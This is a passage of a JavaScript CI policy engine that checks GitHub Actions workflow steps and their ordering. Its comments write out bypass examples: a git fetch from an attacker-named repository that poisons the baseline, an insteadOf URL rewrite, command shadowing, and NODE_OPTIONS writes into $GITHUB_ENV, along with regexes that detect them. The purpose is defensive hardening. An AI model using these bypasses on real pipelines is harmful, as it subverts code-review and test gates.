 * escaped, and nothing about what is linted.
 */
// `-version` prints a banner and lints nothing, and it satisfied the `-color`
// test happily: `actionlint -color -version` was clean.
const ACTIONLINT_FLAGS = ['-color', '--color'];
const ACTIONLINT_FLAG_TABLE = flagTable(ACTIONLINT_FLAGS);

/**
 * ── THE OPERAND NOBODY LOOKED AT (#40 round 7) ──────────────────────────────
 * This rule checked the command word and the presence of `-color`, and stopped.
 * `actionlint` with no file operands lints *every* workflow it finds in the
 * repository; given one it lints exactly that one. So
 *
 *     run: '"$RUNNER_TEMP/actionlint" -color .github/workflows/ci.yml'
 *
 * was policy-clean against the engine as committed, with a second workflow file
 * — `.github/workflows/x.yaml`, say — never linted at all. That is the identical
 * defect `CHECKS_ALL_WORKFLOWS` three declarations below exists for, in the step
 * immediately above it: round 6 pinned this engine's own argument to the
 * workflow *directory* and left the linter beside it pointed at whatever the
 * author felt like naming. Until now it was caught only *incidentally* — the
 * self-test pins that `run:` line verbatim in a `replaceOnce` — which is an
 * alarm on one spelling rather than a rule about the class.
 *
 * So: zero positional operands, options only. The step in ci.yml already reads
 * `'"$RUNNER_TEMP/actionlint" -color'`, so nothing in the workflow moves; what
 * changes is that adding an operand is now a red build instead of a quiet
 * narrowing of what gets linted.
 */
const RUNS_ACTIONLINT = command(
  '`actionlint -color`, with no file operands so it lints every workflow',
  ['actionlint'],
  ({ argv }) => {
    if (basename(argv[0]) !== 'actionlint') return false;
    const scan = scanOptions(argv, ACTIONLINT_FLAG_TABLE);
    if (scan === null || scan.operands.length > 0) return false;
    return argv.slice(1).some((word) => word === '-color' || word === '--color');
  },
  ACTIONLINT_FLAGS,
);
const RUNS_LINT = packageScript('lint');
const RUNS_TYPECHECK = packageScript('typecheck');
const RUNS_BUILD = packageScript('build');
const WAITS_FOR_POSTGRES = invokes('wait-for-postgres\\.mjs');
const RUNS_MIGRATIONS = binary('drizzle-kit', [], 'migrate');
// `-t nomatch_xyz` runs zero tests and exits 0, and the report gate reads a
// report of a run that matched nothing. Same class as `--dry-run`.
//
// Both of these carry a value and the value is genuinely data — a reporter name
// or a path to one, and the file the json reporter writes. Written attached, the
// spelling the workflow uses; the spaced form is refused rather than consumed,
// because a flag whose value this table does not read is a flag that can eat the
// word after it (`node --disable-warning <script>`, measured in
// `NODE_FLAGS_ALLOWED`). What the *values* are is not claimed here and does not
// need to be: `assert-vitest-report.mjs` reads `vitest-report.json` at a fixed
// path and fails when it is absent or stale, which is the runtime half.
const RUNS_VITEST = binary(
  'vitest',
  [
    { flag: '--reporter', value: /^\S+$/ },
    { flag: '--outputFile.json', value: /^\S+$/ },
  ],
  'run',
);
const INSTALLS_CHROMIUM = binary('playwright', ['--with-deps'], 'install');
const MIGRATES_E2E_DATABASE = invokesIn(String.raw`e2e\/support`, String.raw`ensure-database\.mjs`);
const ASSERTS_CHROMIUM = invokes('assert-chromium\\.mjs');
// `--list` prints the tests and runs none of them; `-g`/`--grep` runs the ones
// that match a pattern, which may be none.
const RUNS_PLAYWRIGHT = binary('playwright', [{ flag: '--reporter', value: /^\S+$/ }], 'test');

/**
 * The `deploy` job's four compose verbs (#40).
 *
 * ── WHY THESE ARE NOT `docker compose …` ANY MORE (round 3) ─────────────────
 * They were, and the round-2 gauntlet found what that cost: "preflight resolves
 * `ATRIUM_COMPOSE_FILES`; build/up/cp/down hard-code the two base files. An
 * extra 'safe' overlay lets preflight see `gateway_mode=nat` while the real `up`
 * uses a routed base network." Two expressions of one file list, and nothing
 * comparing them — so every check that reads the *resolved configuration* was
 * inspecting a stack that need not be the one that came up.
 *
 * `scripts/ci/compose-stack.mjs` is now the only thing in this repository that
 * says `docker compose` about the deployed stack, and it takes the file list
 * from `composeArgs` — the same function every assertion uses. The
 * `compose-through-one-entrypoint` rule refuses a bare `docker compose` in the
 * `deploy` job, so a literal file list cannot come back quietly.
 *
 * The flags that used to be visible here — `--wait` on the boot, `-v` on the
 * teardown — moved into that file with them. That is a real trade, paid for in
 * `gate-selftest.mjs`, which asserts the argv `compose-stack.mjs` builds for
 * every verb: a test of the code that runs, rather than a match against the text
 * beside it.
 */
function composeStack(verb) {
  const path = /^(?:\.\.\/)*scripts\/ci\/compose-stack\.mjs$/;
  return command(
    `\`node scripts/ci/compose-stack.mjs ${verb}\``,
    ['node'],
    ({ argv }) => {
      if (argv[0] !== 'node') return false;
      if (!runsItsScript(argv)) return false;
      const script = firstOperand(argv);
      if (script === undefined || !path.test(script)) return false;
      return firstOperand(argv, argv.indexOf(script) + 1) === verb;
    },
    NODE_FLAG_SPECS,
  );
}

const BUILDS_IMAGES = composeStack('build');
const PREFLIGHTS_HOST = invokes('assert-deploy-preflight\\.mjs');
const RECORDS_IMAGES = invokes('record-built-images\\.mjs');
const ASSERTS_MIGRATION_IMAGE = invokes('assert-migration-image\\.mjs');
const STARTS_STACK = composeStack('up');
const TRUSTS_CA = composeStack('trust-ca');
const TEARS_DOWN = composeStack('down');
const ASSERTS_SIGNUP = invokes('assert-signup-verifies\\.mjs');

/**
 * The report files being *deleted*, which is the other half of a report reset.
 *
 * Round 3 of #40 split "Reset the test reports" into a delete step and a record
 * step, because a protected step is one command now. A blind cross-lineage
 * review caught what that cost: the pair only ever named the `$GITHUB_ENV`
 * export, so after the split the delete could be dropped with the policy still
 * clean. Deleting it is not harmless — the freshness check is an mtime
 * comparison, and a report restored from a cache with a new mtime passes it.
 */
function deletesReports(...files) {
  return command(
    `\`rm -f ${files.join(' ')}\``,
    ['rm'],
    ({ argv }) => {
      if (basename(argv[0]) !== 'rm') return false;
      return files.every((file) => argv.slice(1).includes(file));
    },
    ['-f', '--force'],
  );
}

const DELETES_VITEST_REPORTS = {
  what: 'the step that deletes the vitest reports',
  test: deletesReports('vitest-report.json', 'vitest-ci-report.json'),
  because:
    "freshness is proven by comparing a report's mtime against a recorded timestamp, and a report restored from a cache carries a new mtime; deleting them first is what makes the timestamp mean the run rather than the restore",
};
const DELETES_E2E_REPORT = {
  what: 'the step that deletes the e2e report',
  test: deletesReports('playwright-report.json'),
  because: 'same reason as the vitest delete: a leftover report is the quietest possible green',
};

/**
 * The refspec that actually produces `origin/main`, whole.
 *
 * `assert-floor-ratchet.mjs` reads `origin/main`, so the destination half is the
 * part that matters and it is the part round 5 did not look at. The leading `+`
 * is optional (a shallow fetch of a branch that only fast-forwards does not need
 * it); everything else is fixed, because there is exactly one ref the ratchet
 * compares against.
 */
const BASELINE_REFSPEC = /^\+?refs\/heads\/main:refs\/remotes\/origin\/main$/;

/**
 * The remote half, which round 6 pinned the destination of and not the source of.
 *
 * ── THE DEFECT (#40 round 7) ────────────────────────────────────────────────
 * `git fetch`'s positional operands are `<remote> <refspec>…`, and this matcher
 * read the refspec and never the remote. Measured against the engine as
 * committed:
 *
 *     run: git fetch --no-tags --depth=1 https://github.com/attacker/atrium \
 *          +refs/heads/main:refs/remotes/origin/main
 *
 * is **policy-clean**. `origin/main` then resolves — it resolves to a tree of
 * the author's choosing — so `assert-floor-ratchet.mjs`'s "fatal on an
 * unresolvable ref" check is satisfied and every floor in this pull request is
 * compared against a baseline somebody else wrote. Round 6 closed "the refspec
 * names a ref nobody reads" and left "the ref is filled from a repository nobody
 * named", which is the same sentence with the operands swapped.
 *
 * So the remote is the word `origin` and nothing else, and no operand may look
 * like a location at all — a URL, an scp-style `user@host:path`, an absolute or
 * relative path, or a `.git` directory. `origin` is what `actions/checkout`
 * configures and what the ratchet reads back; a fetch that names its source
 * inline is a fetch this repository has no reason to write.
 *
 * ── WHERE THIS STOPS, STATED RATHER THAN CHASED ─────────────────────────────
 * `origin` is a *name*, and this rule pins the words of one command. An earlier
 * step of the same job running `git remote set-url origin https://…` or
 * `git config remote.origin.url …` re-points it, and neither is a construct any
 * rule in this file refuses today: `no-command-shadowing` bans redefinitions of
 * the *command word* `git`, not things git is asked to do. The `-c` clause above
 * closes the per-invocation spelling because that one rides on the very command
 * this matcher reads; the separate-step spelling is a second command and is
 * outside what a matcher over one argv can see. Closing it means a rule about
 * what a job may do to its git configuration, which is a new prohibition with no
 * measured defect behind it yet — so it is written down here rather than guessed
 * at, in the same voice as the composite-action gap at the top of this file.
 */
const BASELINE_REMOTE = 'origin';
/** A word that names a repository somewhere rather than a configured remote. */
const LOOKS_LIKE_A_LOCATION = /:\/\/|^[./~]|^[^/]*@|\.git$/;

/**
 * The flags the baseline fetch may carry — with the values each of them may
 * carry, which is the half that was missing.
 *
 * `--dry-run` is the one that matters most in this file: it keeps every word
 * this matcher reads and updates no ref, so `origin/main` never materialises and
 * the ratchet takes its no-baseline exit-0 path — the ticket's founding defect,
 * wearing a flag, policy-clean until this list existed. It is refused by not
 * being here.
 *
 * `-c` is the one that mattered most in round 7. It stays, because
 * `git -c protocol.version=2 fetch …` is a legitimate hardening spelling with an
 * ACCEPTED_FORMS fixture — nothing in ci.yml writes it today, and an allowlist
 * entry nobody exercises is an attack surface nobody tests, so the fixture is
 * what earns it its place rather than the workflow. What is refused is every
 * other config assignment, and the reason is one line long:
 * `-c url.<attacker>.insteadOf=<real>` makes git rewrite the URL before it
 * connects, so a fetch that names `origin` and the exact refspec still ends up
 * with `origin/main` pointing at a tree of the author's choosing. `http.proxy`,
 * `core.gitProxy`, `remote.origin.url` and the next transport knob are all
 * refused by the same clause, without this file having heard of them.
 *
 * `--depth` takes a count, and both spellings are real: `--depth=1` is what the
 * workflow writes and `--depth 1` is the same command. The separate form is
 * *consumed* here, so `1` is not mistaken for the remote operand below.
 */
const FETCH_FLAGS = [
  '--no-tags',
  { flag: '--depth', value: /^[0-9]+$/, separate: true },
  { flag: '-c', value: /^protocol\.version=[0-9]+$/, separate: true },
];
const FETCH_FLAG_TABLE = flagTable(FETCH_FLAGS);

const FETCHES_BASELINE = {
  what: 'the fetch of the baseline manifest from main',
  test: command(
    '`git fetch … origin +refs/heads/main:refs/remotes/origin/main`',
    ['git'],
    ({ argv }) => {
      if (basename(argv[0]) !== 'git') return false;
      // The operands, with every flag's value consumed by the table above.
      // `firstOperand` in shell-command.mjs cannot do this — it does not know
      // which flags take a value, so it reads `git -c protocol.version=2 fetch`
      // as a command whose first operand is `protocol.version=2` — and that
      // function is deliberately left alone: the arity is declared here, so the
      // scan belongs here too.
      const scan = scanOptions(argv, FETCH_FLAG_TABLE);
      if (scan === null) return false;
      const [subcommand, remote, ...refspecs] = scan.operands;
      // The subcommand as the *first* operand rather than by membership: round 6
      // used `includes('fetch')`, which a `-c` value spelling the word satisfies.
      if (subcommand !== 'fetch') return false;
      if (remote !== BASELINE_REMOTE) return false;
      if (scan.operands.some((word) => LOOKS_LIKE_A_LOCATION.test(word))) return false;
      // The whole refspec, as one word, and not merely a word that *contains*
      // `refs/heads/main`. Round 5 asked for the substring, which accepts
      // `+refs/heads/main:refs/remotes/origin/mainx` — a fetch that updates a
      // ref nobody reads. A blind review checked whether that reproduces and
      // found it does not, for a reason that is not this rule: `actions/checkout`
      // runs `git remote add origin …`, so git's opportunistic remote-tracking
      // update writes `origin/main` anyway, and `git -c remote.origin.fetch=…`
      // *appends* to that multi-valued key rather than replacing it. So the gap
      // was real and held shut by git's behaviour. One `git config --unset` in an
      // earlier step, or a checkout action that stops adding the remote, and it
      // opens. Rules do not get to rely on that.
      return refspecs.some((word) => BASELINE_REFSPEC.test(word));
    },
    FETCH_FLAGS,
  ),
  because:
    'without it the shallow clone actions/checkout leaves has no `origin/main`, so the ratchet finds no baseline, reports that politely, and exits 0 — a floor lowered in the same pull request would sail through the very gate that exists to catch it',
};
const RESETS_VITEST_REPORT = {
  what: 'the step that deletes the vitest reports and records VITEST_RUN_START',
  test: exportsToJobEnv('VITEST_RUN_START'),
  because:
    "the gate proves a report is fresh by comparing its mtime against that timestamp; with no reset the previous run's report is still on disk, and with no timestamp freshness cannot be proven at all",
};
const RESETS_E2E_REPORT = {
  what: 'the step that deletes the e2e report and records E2E_RUN_START',
  test: exportsToJobEnv('E2E_RUN_START'),
  because: 'same reason as the vitest reset: a leftover report is the quietest possible green',
};

/**
 * Steps that must exist, by job — and, where one only means something because
 * of an earlier step, that pair.
 *
 * A job can satisfy every rule above and still prove nothing, by simply not
 * running the checks any more — delete the policy step and the policy stops
 * objecting to its own absence. That is circular, and knowingly so: it cannot
 * stop an author who means it (see SCOPE at the top of this file). What it does
 * stop is the accident — a step dropped during a rebase, a script renamed
 * without its call site, a job hollowed out to "make CI fast" — which is the
 * threat model this repo actually has today.
 */
const REQUIRED_STEPS = {
  verify: [
    // Matches actionlint being *run*, not merely downloaded — the install step
    // names it too, and a job that fetches a linter it never invokes is exactly
    // the shape this rule is looking for.
    { rule: 'policy-steps-present', what: 'actionlint', test: RUNS_ACTIONLINT },
    {
      rule: 'policy-steps-present',
      what: 'the workflow policy engine, over the whole workflow directory',
      test: CHECKS_ALL_WORKFLOWS,
    },
    {
      rule: 'policy-steps-present',
      what: "the policy engine's own self-test",
      test: invokes('workflow-policy-selftest\\.mjs'),
    },
    {
      rule: 'policy-steps-present',
      what: "the test gates' self-test",
      test: invokes('gate-selftest\\.mjs'),
    },
    { rule: 'required-job-steps', what: 'the linter', test: RUNS_LINT },
    { rule: 'required-job-steps', what: 'the typechecker', test: RUNS_TYPECHECK },
    { rule: 'required-job-steps', what: 'the build', test: RUNS_BUILD },
    {
      rule: 'required-job-steps',
      what: 'the workspace-enrollment assertion',
      test: invokes('assert-workspace-enrollment\\.mjs'),
    },
    {
      rule: 'required-job-steps',
      what: 'the floor-ratchet assertion',
      test: invokes('assert-floor-ratchet\\.mjs'),
      requires: [FETCHES_BASELINE],
    },
    {
      rule: 'required-job-steps',
      what: 'the wait for Postgres',
      test: WAITS_FOR_POSTGRES,
    },
    {
      rule: 'required-job-steps',
      what: 'the migrations',
      test: RUNS_MIGRATIONS,
      requires: [
        {
          what: 'the wait for Postgres',
          test: WAITS_FOR_POSTGRES,
          because:
            'migrating against a container that has not finished starting is a race, and a race that loses looks like a broken migration rather than a slow database',
        },
      ],
    },
    {
      rule: 'required-job-steps',
      what: 'the schema set-equality assertion',
      test: invokes('assert-tables\\.mjs'),
      requires: [
        {
          what: 'the migrations',
          test: RUNS_MIGRATIONS,
          because:
            'set equality against a database nobody migrated compares the built schema with an empty database — which is a real failure, but a confusing one, and the ordering is the thing that makes the assertion mean "the migrations did work"',
        },
      ],
    },
    {
      rule: 'required-job-steps',
      what: 'the unit/integration suite',
      test: RUNS_VITEST,
      requires: [RESETS_VITEST_REPORT, DELETES_VITEST_REPORTS],
    },
    {
      rule: 'required-job-steps',
      what: 'the vitest report gate',
      test: invokes('assert-vitest-report\\.mjs'),
      requires: [
        {
          what: 'the unit/integration suite',
          test: RUNS_VITEST,
          because:
            'a report gate that runs before the runner reads whatever was on disk beforehand, which is the definition of the stale-report failure it exists to prevent',
        },
      ],
    },
  ],
  e2e: [
    {
      rule: 'required-job-steps',
      what: 'the browser-presence assertion',
      test: ASSERTS_CHROMIUM,
      requires: [
        {
          what: 'the Chromium install',
          test: INSTALLS_CHROMIUM,
          because:
            'asserting a browser is present before anything installs one is a check guaranteed to fail, and a check guaranteed to fail is a check somebody will delete',
        },
      ],
    },
    {
      rule: 'required-job-steps',
      what: 'the e2e database migration',
      test: MIGRATES_E2E_DATABASE,
    },
    {
      rule: 'required-job-steps',
      what: 'the Playwright suite',
      test: RUNS_PLAYWRIGHT,
      requires: [
        RESETS_E2E_REPORT,
        DELETES_E2E_REPORT,
        {
          what: 'the browser-presence assertion',
          test: ASSERTS_CHROMIUM,
          because:
            'the smoke spec skips itself when no browser is installed, which is right on a laptop and a lie in CI; the assertion has to come first or the suite has already reported green over zero executed tests',
        },
        {
          what: 'the e2e database migration',
          test: MIGRATES_E2E_DATABASE,
          because:
            '`pnpm test:e2e` runs it before Playwright on a laptop, and this job invokes `playwright test` directly so the policy can see the command rather than a package.json alias — which means the migration is a step of its own and can be dropped like any other. Playwright starts its `webServer` processes before `globalSetup` would run, so without it two servers query tables that do not exist and every spec fails at sign-up',
        },
      ],
    },
    {
      rule: 'required-job-steps',
      what: 'the e2e report gate',
      test: invokes('assert-playwright-report\\.mjs'),
      requires: [
        {
          what: 'the Playwright suite',
          test: RUNS_PLAYWRIGHT,
          because: 'same as the vitest gate: a report read before the run is last run’s report',
        },
      ],
    },
  ],
  /**
   * The deployment job (#40), where every gate is about a running stack.
   *
   * Ordering is nearly the whole content of these rules. Every assertion here
   * reads state that an earlier step created — the images, the containers, the
   * certificate authority, the absence of the containers — and every one of
   * them, run early, would be *right about the wrong moment*. Two of them would
   * fail loudly (there is no stack to inspect); the teardown assertion is the
   * dangerous shape, because run before the teardown it inspects a stack that
   * is still up, and run after a teardown that lost its `-v` it inspects
   * volumes nobody deleted.
   */
  deploy: [
    {
      rule: 'required-job-steps',
      what: 'the deployment preflight',
      test: PREFLIGHTS_HOST,
    },
    {
      rule: 'required-job-steps',
      what: 'the image build',
      test: BUILDS_IMAGES,
    },
    {
      rule: 'required-job-steps',
      what: 'the image record',
      test: RECORDS_IMAGES,
      requires: [
        {
          what: 'the image build',
          test: BUILDS_IMAGES,
          because:
            'it resolves each service image name to the ID that answers to it *now*; run before the build it records the previous run’s image, and every identity assertion afterwards then agrees with a stale answer',
        },
      ],
    },
    {
      rule: 'required-job-steps',
      what: 'the migration-image assertion',
      test: ASSERTS_MIGRATION_IMAGE,
      requires: [
        {
          what: 'the image record',
          test: RECORDS_IMAGES,
          because:
            'it compares the image the resolved configuration gives `migrate` against the ID that step wrote down; with no manifest there is nothing to compare against and the one container whose work cannot be undone runs unchecked',
        },
      ],
    },
    {
      rule: 'required-job-steps',
      what: 'the stack boot',
      test: STARTS_STACK,
      requires: [
        {
          what: 'the image build',
          test: BUILDS_IMAGES,
          because:
            'compose would otherwise start whatever image happens to be in the local cache from a previous run — which is how a build that has been failing since a workspace package landed goes unnoticed for three rounds',
        },
        {
          what: 'the deployment preflight',
          test: PREFLIGHTS_HOST,
          because:
            'it refuses a host whose engine publishes loopback-bound ports off-box, and the whole value of refusing is refusing *before* the stack is up: after `up` the mailpit UI this deployment documents as unreachable has already been listening on a host where it is not',
        },
        {
          what: 'the migration-image assertion',
          test: ASSERTS_MIGRATION_IMAGE,
          because:
            '`migrate` is a one-shot that `server` and `app` both wait on, so it runs *inside* this step — a wrong migration image has already altered a persistent volume by the time `assert-image-identity` looks at any container. This is the ordering the round-2 gauntlet named, and the only place the answer can still be no is before the boot',
        },
      ],
    },
    {
      rule: 'required-job-steps',
      what: 'the certificate-authority copy',
      test: TRUSTS_CA,
      requires: [
        {
          what: 'the stack boot',
          test: STARTS_STACK,
          because:
            "Caddy mints its internal root the first time it serves, so copying it out before the proxy is running copies nothing and every assertion afterwards falls back to the system trust store — where this deployment's certificate is not, so they would all fail for the wrong reason",
        },
      ],
    },
    {
      rule: 'required-job-steps',
      what: 'the container-health assertion',
      test: invokes('assert-stack-health\\.mjs'),
      requires: [
        {
          what: 'the stack boot',
          test: STARTS_STACK,
          because:
            'inspecting the health of containers that were never started reports that the stack has no containers, which is true and is not the question',
        },
      ],
    },
    {
      rule: 'required-job-steps',
      what: 'the production-configuration assertion',
      test: invokes('assert-stack-config\\.mjs'),
      requires: [
        {
          what: 'the stack boot',
          test: STARTS_STACK,
          because:
            'this reads NODE_ENV and both public origins back out of the *running* containers, precisely so an overlay cannot quietly turn the job into a check on a development stack; there is nothing to read before they run',
        },
      ],
    },
    {
      rule: 'required-job-steps',
      what: 'the image-identity assertion',
      test: invokes('assert-image-identity\\.mjs'),
      requires: [
        {
          what: 'the image record',
          test: RECORDS_IMAGES,
          because:
            'it compares the running containers against the IDs that step wrote down; with no manifest there is nothing to compare to, and the binding between built, scanned and running is back to a shared tag',
        },
        {
          what: 'the stack boot',
          test: STARTS_STACK,
          because:
            'the running side of the comparison is `docker inspect` on containers; before the boot there are none, and "no container is running the wrong image" is true of an empty stack',
        },
      ],
    },
    {
      rule: 'required-job-steps',
      what: 'the compiled-origin assertion',
      test: invokes('assert-image-origins\\.mjs'),
      requires: [
        {
          what: 'the image build',
          test: BUILDS_IMAGES,
          because:
            'it scans the image that was just built; against a stale one it reports on a bundle nobody is about to deploy',
        },
        {
          what: 'the image record',
          test: RECORDS_IMAGES,
          because:
            'the scan reads the image *ID* that step captured rather than a tag anybody can re-point, so without it there is nothing naming which image to scan — which is precisely how it came to scan one nobody was running',
        },
      ],
    },
    {
      rule: 'required-job-steps',
      what: 'the composed-stack schema assertion',
      test: invokes('assert-stack-schema\\.mjs'),
      requires: [
        {
          what: 'the stack boot',
          test: STARTS_STACK,
          because:
            'the migration it is checking the result of runs during the boot, and before that there is no database to read a schema out of',
        },
      ],
    },
    {
      rule: 'required-job-steps',
      what: 'the signup-and-verification assertion',
      test: ASSERTS_SIGNUP,
      requires: [
        {
          what: 'the certificate-authority copy',
          test: TRUSTS_CA,
          because: 'same client, same verification, same failure without the root',
        },
      ],
    },
    {
      rule: 'required-job-steps',
      what: 'the real-page assertion',
      test: invokes('assert-page-serves\\.mjs'),
      requires: [
        {
          what: 'the certificate-authority copy',
          test: TRUSTS_CA,
          because:
            'the client verifies the chain against that root and never disables verification, so without it every request fails on the certificate instead of telling anybody whether the app serves',
        },
        {
          what: 'the signup-and-verification assertion',
          test: ASSERTS_SIGNUP,
          because:
            'the page assertion proves `/` is the app by rendering it *as a per-run account*, which means it drives the same signup-and-verify flow. Run first, it would go red on a broken mail path as well — two steps failing for one reason, and the ledger crediting whichever came first. The mail path belongs to the earlier step, so this one’s failures are about pages',
        },
      ],
    },
    {
      rule: 'required-job-steps',
      what: 'the websocket-upgrade assertion',
      test: invokes('assert-ws-upgrade\\.mjs'),
      requires: [
        {
          what: 'the certificate-authority copy',
          test: TRUSTS_CA,
          because: 'the upgrade is a TLS connection first; without the root it never gets that far',
        },
      ],
    },
    {
      rule: 'required-job-steps',
      what: 'the per-address rate-limit assertion',
      test: invokes('assert-rate-limit\\.mjs'),
      requires: [
        {
          what: 'the certificate-authority copy',
          test: TRUSTS_CA,
          because:
            'its two callers run in containers that mount that root and verify against it, so without the file both of them fail to connect and the limiter is never exercised',
        },
      ],
    },
    {
      rule: 'required-job-steps',
      what: 'the teardown assertion',
      test: invokes('assert-stack-teardown\\.mjs'),
      requires: [
        {
          what: 'the teardown',
          test: TEARS_DOWN,
          because:
            'run before the teardown it finds a running stack and calls it a leak; and it is the only thing that notices a teardown which lost its `-v` and left four named volumes behind, which on a real host is next month’s database being adopted with last month’s schema in it',
        },
      ],
    },
  ],
};

/** Stable identity for one (job, step, prerequisite) edge. */
export function pairId({ job, step, needs }) {
  return `${job}: ${step} ← ${needs}`;
}

/**
 * Every declared (step → prerequisite) edge, derived from REQUIRED_STEPS.
 *
 * Round 2's lesson, applied to the new rule before it can bite: the receipt for
 * that round said "15 rules" over an engine carrying 18, because the number was
 * something a human counted. Anything a receipt wants to quote about this table
 * comes from here.
 *
 * Round 5 makes the *identities* load-bearing too, not only the count: every
 * violation this rule emits carries the pair it is about, and the self-test
 * requires each pair below to be named by at least one mutation. Round 4's
 * self-test asserted only that some violation carried the rule id, which a
 * mutation that trips a different pair satisfies just as well as the one it
 * claims to model.
 */
export const PREREQUISITE_PAIRS = Object.entries(REQUIRED_STEPS).flatMap(([jobId, required]) =>
  required.flatMap((step) =>
    (step.requires ?? []).map((prerequisite) => ({
      job: jobId,
      step: step.what,
      needs: prerequisite.what,
    })),
  ),
);

/**
 * The command words every rule above depends on meaning what they say.
 *
 * Derived from the matchers themselves — plus the launchers and package managers
 * `shell-command.mjs` unwraps, since shadowing `timeout` or `pnpm` defeats
 * recognition just as thoroughly as shadowing `git`. A matcher added without a
 * thought for this list still protects its own command word.
 */
export const PROTECTED_COMMANDS = [
  ...new Set([
    ...MATCHERS.flatMap((matcher) => matcher.names),
    ...LAUNCHER_NAMES,
    ...PACKAGE_MANAGER_NAMES,
  ]),
].sort();

/**
 * The set above is *declared*, and a declaration can be emptied.
 *
 * ── THE DEFECT (#40 round 4, from a blind review of the shared engine) ──────
 * `PROTECTED_COMMANDS` is derived from each matcher's `names`, and `names` is a
 * field a matcher carries alongside the `match` predicate that does the work.
 * Zero every matcher's `names` — or replace this export with `[]` — and every
 * presence rule still fires, because `match` is untouched; `no-command-shadowing`
 * still refuses `PATH`, `hash -p` and `$GITHUB_PATH`, because those are matched
 * by name in the rule itself. What silently stops being caught is
 * `git() { :; }` and `alias git=…`: the words are gone from the set the rule
 * checks against, and the rule goes quiet while looking exactly as green.
 *
 * Deriving the *count* from the table (round 3) made exempting a stage visible.
 * Nothing did the same for the *set*, so this does. For every required step and
 * every prerequisite this policy declares, the real workflow is parsed and the
 * command words that step actually uses — the word in command position, and
 * every launcher and package manager unwrapped to reach it — must be in
 * `PROTECTED_COMMANDS`. Empty a matcher's `names` and its verb drops out of the
 * set while the step still satisfies the matcher, and this rule names it.
 *
 * It is deliberately computed from the workflow rather than from the matchers:
 * a check that asked the matchers what they depend on would be asking the thing
 * under test. The workflow is the independent witness — these are the words CI
 * really runs.
 *
 * @param {object} jobs the workflow's `jobs` mapping
 * @param {string[]} protectedCommands the set to check against; a parameter so
 *   the self-test can hand it a gutted one and watch this fire
 */
export function protectedCommandCoverage(jobs, protectedCommands = PROTECTED_COMMANDS) {
  const held = new Set(protectedCommands);
  const problems = [];
  for (const [jobId, required] of Object.entries(REQUIRED_STEPS)) {
    const job = jobs[jobId];
    if (!isPlainObject(job)) continue;
    const scripts = (Array.isArray(job.steps) ? job.steps : [])
      .filter((step) => isPlainObject(step) && typeof step.run === 'string')
      .map((step) => step.run);
    const matchers = [];
    for (const step of required) {
      matchers.push([step.what, step.test]);
      for (const prerequisite of step.requires ?? []) {
        matchers.push([prerequisite.what, prerequisite.test]);
      }
    }
    for (const [what, matcher] of matchers) {
      for (const script of scripts) {
        for (const command of completedCommands(script)) {
          if (!matcher.match(command)) continue;
          // The words a *shell* resolves, which is what shadowing is about. The
          // first word written, and every launcher and package manager stripped
          // to reach the real command — plus the unwrapped command word itself,
          // unless a package manager did the unwrapping, because `pnpm lint`
          // resolves `lint` in package.json and bash never sees it. That last
          // clause is not a convenience: without it this rule demanded that
          // `lint`, `typecheck` and `build` be protected against a shell
          // function that could not affect them, which is a false red and the
          // fastest way to get a rule deleted.
          const via = command.via ?? [];
          const words = [
            basename(command.raw[0] ?? ''),
            ...via.map(({ name }) => name),
            ...(via.some(({ kind }) => kind === 'manager')
              ? []
              : [basename(command.argv[0] ?? '')]),
          ].filter(Boolean);
          for (const word of words) {
            if (held.has(word)) continue;
            problems.push(
              `jobs.${jobId}: the step satisfying "${what}" runs \`${word}\` in command position, and \`${word}\` is not in PROTECTED_COMMANDS — so \`${word}() { :; }\` and \`alias ${word}=…\` are not refused by \`no-command-shadowing\`, and this rule is recognising a word anybody can redefine. PROTECTED_COMMANDS is derived from each matcher's \`names\`; a matcher whose \`names\` no longer lists the verbs its \`match\` depends on is a rule that still fires and no longer protects anything.`,
            );
          }
        }
      }
    }
  }
  return [...new Set(problems)];
}

/** Ways to make a command word mean something other than the command. */
const SHADOWING_BUILTINS = new Set(['alias', 'export', 'declare', 'typeset', 'readonly', 'local']);

/**
 * A word that expands to the job's environment file, or its PATH file.
 *
 * ── TWO SPELLINGS, ONE FROM EACH BLIND REVIEW (#40 round 5, second pass) ────
 * Round 4 tested the redirection target against `/^\$\{?GITHUB_ENV\}?$/`, which
 * is neither of the two things it needs to be:
 *
 *   - It misses the other expansions bash resolves to the same path.
 *     `echo "NODE_OPTIONS=…" >> "${GITHUB_ENV:?}"` writes the job environment
 *     and matched nothing, so the payload was never inspected. `${GITHUB_ENV:-}`
 *     and `${GITHUB_ENV+x}` are the same trick with different punctuation, and
 *     the next one is a character nobody has thought of — so the *forms* are
 *     enumerated here rather than the variable's bare name.
 *   - It only ever looked at *redirections*, and a file can be named as an
 *     argument: `printf '%s\\n' 'NODE_OPTIONS=…' | tee -a "$GITHUB_ENV"` has no
 *     redirection at all. `tee`, `dd of=`, `sponge` and the next one are one
 *     clause if the question is "does any word of this command name that file",
 *     and an unbounded list if it is "which writer is it".
 *
 * And it is a *substring* test, which the first draft of this predicate got
 * wrong in the same way it got the redirection-only version wrong: `dd
 * of="$GITHUB_ENV"` and `sh -c 'echo … >> $GITHUB_ENV'` both name the file
 * inside a longer word, so an anchored comparison sees neither. The direction
 * of the over-approximation is deliberate — `>> "$GITHUB_ENV.bak"` now reads as
 * naming the job environment, which is a step nothing in this repository has
 * and which is refused rather than admitted. Its own rule is untouched: the
 * *prerequisite* matcher `exportsToJobEnv` still compares the target as a whole
 * word, because there the mistake was the opposite one.
 */
const jobFilePattern = (name) =>
  new RegExp(String.raw`\$(?:${name}\b|\{${name}(?![A-Za-z0-9_])[^}]*\})`);
const GITHUB_ENV_FILE = jobFilePattern('GITHUB_ENV');
const GITHUB_PATH_FILE = jobFilePattern('GITHUB_PATH');

/**
 * True when this command writes that file, by redirection or by argument.
 *
 * Both halves require a *live* expansion, and the reason is the shape of this
 * whole ticket. `>> '$GITHUB_ENV'` single-quoted creates a file with a funny
 * name and exports nothing, so reading it as the job environment is a false
 * red. The tempting widening — any word containing the text, quoted or not —
 * catches `sh -c 'echo NODE_OPTIONS=… >> $GITHUB_ENV'`, where the quote that
 * makes it inert here is what makes it live for the next shell. It also catches
 * `echo 'echo NODE_OPTIONS=… >> "$GITHUB_ENV"'`, which prints a line and writes
 * nothing, and that is the `echo` decoy this repository has spent four rounds
 * learning to tell apart from the thing it quotes. This parser cannot: the two
 * are the same word, and only the *command* distinguishes them.
 *
 * So the boundary is stated instead of guessed at, and it is the one already on
 * the record. `sh -c '<script>'` hides an entire script from an engine that
 * reads `run:` — the deploy job refuses it by name (`compose-through-one-entrypoint`
